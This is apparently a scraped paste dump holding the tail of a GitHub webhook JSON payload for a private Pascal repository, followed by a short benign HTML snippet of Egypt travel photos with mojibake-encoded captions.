    ""description"": ""Projetos Su√≠te Sol.NET Desktop Windows"",
    ""fork"": false,
    ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET"",
    ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/forks"",
    ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/keys{/key_id}"",
    ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/collaborators{/collaborator}"",
    ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/teams"",
    ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/hooks"",
    ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/events{/number}"",
    ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/events"",
    ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/assignees{/user}"",
    ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/branches{/branch}"",
    ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/tags"",
    ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/blobs{/sha}"",
    ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/tags{/sha}"",
    ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/refs{/sha}"",
    ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/trees{/sha}"",
    ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/statuses/{sha}"",
    ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/languages"",
    ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/stargazers"",
    ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/contributors"",
    ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/subscribers"",
    ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/subscription"",
    ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/commits{/sha}"",
    ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/commits{/sha}"",
    ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/comments{/number}"",
    ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/comments{/number}"",
    ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/contents/{+path}"",
    ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/compare/{base}...{head}"",
    ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/merges"",
    ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/{archive_format}{/ref}"",
    ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/downloads"",
    ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues{/number}"",
    ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls{/number}"",
    ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/milestones{/number}"",
    ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/notifications{?since,all,participating}"",
    ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/labels{/name}"",
    ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/releases{/id}"",
    ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/deployments"",
    ""created_at"": ""2021-08-11T18:14:44Z"",
    ""updated_at"": ""2024-06-20T16:55:46Z"",
    ""pushed_at"": ""2024-06-20T19:08:34Z"",
    ""git_url"": ""git://github.com/hetosoft/ProjetosSol.NET.git"",
    ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.NET.git"",
    ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.NET.git"",
    ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.NET"",
    ""homepage"": """",
    ""size"": 116591,
    ""stargazers_count"": 0,
    ""watchers_count"": 0,
    ""language"": ""Pascal"",
    ""has_issues"": true,
    ""has_projects"": true,
    ""has_downloads"": true,
    ""has_wiki"": true,
    ""has_pages"": false,
    ""has_discussions"": true,
    ""forks_count"": 0,
    ""mirror_url"": null,
    ""archived"": false,
    ""disabled"": false,
    ""open_issues_count"": 26,
    ""license"": null,
    ""allow_forking"": false,
    ""is_template"": false,
    ""web_commit_signoff_required"": false,
    ""topics"": [

    ],
    ""visibility"": ""private"",
    ""forks"": 0,
    ""open_issues"": 26,
    ""watchers"": 0,
    ""default_branch"": ""develop"",
    ""custom_properties"": {

    }
  },
  ""organization"": {
    ""login"": ""hetosoft"",
    ""id"": 53792964,
    ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
    ""url"": ""https://api.github.com/orgs/hetosoft"",
    ""repos_url"": ""https://api.github.com/orgs/hetosoft/repos"",
    ""events_url"": ""https://api.github.com/orgs/hetosoft/events"",
    ""hooks_url"": ""https://api.github.com/orgs/hetosoft/hooks"",
    ""issues_url"": ""https://api.github.com/orgs/hetosoft/issues"",
    ""members_url"": ""https://api.github.com/orgs/hetosoft/members{/member}"",
    ""public_members_url"": ""https://api.github.com/orgs/hetosoft/public_members{/member}"",
    ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
    ""description"": """"
  },
  ""sender"": {
    ""login"": ""wesProg23"",
    ""id"": 20547283,
    ""node_id"": ""MDQ6VXNlcjIwNTQ3Mjgz"",
    ""avatar_url"": ""https://avatars.githubusercontent.com/u/20547283?v=4"",
    ""gravatar_id"": """",
    ""url"": ""https://api.github.com/users/wesProg23"",
    ""html_url"": ""https://github.com/wesProg23"",
    ""followers_url"": ""https://api.github.com/users/wesProg23/followers"",
    ""following_url"": ""https://api.github.com/users/wesProg23/following{/other_user}"",
    ""gists_url"": ""https://api.github.com/users/wesProg23/gists{/gist_id}"",
    ""starred_url"": ""https://api.github.com/users/wesProg23/starred{/owner}{/repo}"",
    ""subscriptions_url"": ""https://api.github.com/users/wesProg23/subscriptions"",
    ""organizations_url"": ""https://api.github.com/users/wesProg23/orgs"",
    ""repos_url"": ""https://api.github.com/users/wesProg23/repos"",
    ""events_url"": ""https://api.github.com/users/wesProg23/events{/privacy}"",
    ""received_events_url"": ""https://api.github.com/users/wesProg23/received_events"",
    ""type"": ""User"",
    ""site_admin"": false
  }
}"
VNsXGmNZ,asd,Joreto,HTML,Thursday 20th of June 2024 02:02:33 PM CDT,"</p>
<h3> </h3>
<div style=""position: relative;display:inline-block;"">
<img src=""/images/egypt2.jpg"" alt=""Egypt2"" width=""1500"" height=""843"">
<div style=""position: absolute; top: 5%; left: 80%; transform: translate(-50%, -50%); background-color: rgb(255,255,255,0.7); padding: 10px; font-size: 20px"" >
    –ö–∞–π—Ä–æ!
</div>
</div>
<div style=""position: relative; display: inline-block;"">
<img src=""/images/egypt.jpg"" alt=""Egypt"" width=""768"" height=""431"">
    <div style=""position: absolute; top: 10%;left: 85%;transform: translate(-50%, -50%); background-color: rgb(255,255,255,0.7); padding: 10px;"">
        –í–µ–ª–∏—á–µ—Å—Ç–≤–µ–Ω –ø–ª–∞–∂!
    </div>
</div>
<div style=""position: relative; display: inline-block;"">
<img src=""/images/egypt1.jpg"" alt=""Egypt1"" width=""768"" height=""431"">
<div style=""position: absolute; top: 10%;left: 10%;transform: translate(-50%, -50%); background-color: rgb(255,255,255,0.7); padding: 10px;"">
    –ü—Ç–∏—Ü–∞ –Ω–∞ –ø–æ—Å—Ç
</div>
    </div>
<div style=""position: relative; display: inline-block;"">
<img src=""/images/giza.webp"" alt=""Giza"" width=""1920"" height=""1355"">
    <div style=""position: absolute; top: 5%;left: 80%;transform: translate(-50%, -50%); background-color: rgb(255,255,255,0.7); padding: 10px;"">
        –ó–∞–ª–µ–∑ –Ω–∞–¥ –ö–∞–π—Ä–æ
    </div>
</div>"
